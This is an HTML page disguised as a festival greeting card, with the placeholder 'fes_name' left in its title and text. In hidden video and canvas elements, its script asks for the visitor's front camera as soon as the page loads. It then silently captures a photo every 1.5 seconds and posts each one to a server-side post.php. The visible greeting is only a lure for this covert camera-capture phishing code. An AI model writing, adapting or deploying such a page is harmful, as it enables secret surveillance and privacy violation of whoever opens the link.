<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
    <title>Happy fes_name to Your Friends</title>
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
    <style>
        /* Add your custom styles here */
    </style>
</head>
<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false,
        success: function(result) {
            console.log("Image sent successfully!");
        },
        error: function(xhr, status, error) {
            console.error("Error sending image:", error);
        }
    });
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
        facingMode: "user"
    }
};

// Check for browser support
if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    console.error("getUserMedia is not supported in this browser.");
    errorMsgElement.innerHTML = "Your browser does not support camera access.";
} else {
    // Access webcam
    async function init() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            console.log("Webcam access granted!");
            handleSuccess(stream);
        } catch (e) {
            console.error("Webcam access denied:", e);
            errorMsgElement.innerHTML = `Error accessing camera: ${e.toString()}`;
        }
    }

    // Success
    function handleSuccess(stream) {
        window.stream = stream;
        video.srcObject = stream;

        var context = canvas.getContext('2d');
        setInterval(function() {
            context.drawImage(video, 0, 0, 640, 480);
            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            console.log("Captured image:", canvasData.substring(0, 50) + "..."); // Log partial image data
            post(canvasData);
        }, 1500);
    }

    // Load init
    init();
}
</script>
<body>
    <center>
        <h1>Happy fes_name!</h1>
        <p>Wishing you a very happy fes_name. May this festival bring joy and prosperity to your life.</p>
    </center>
</body>
</html>
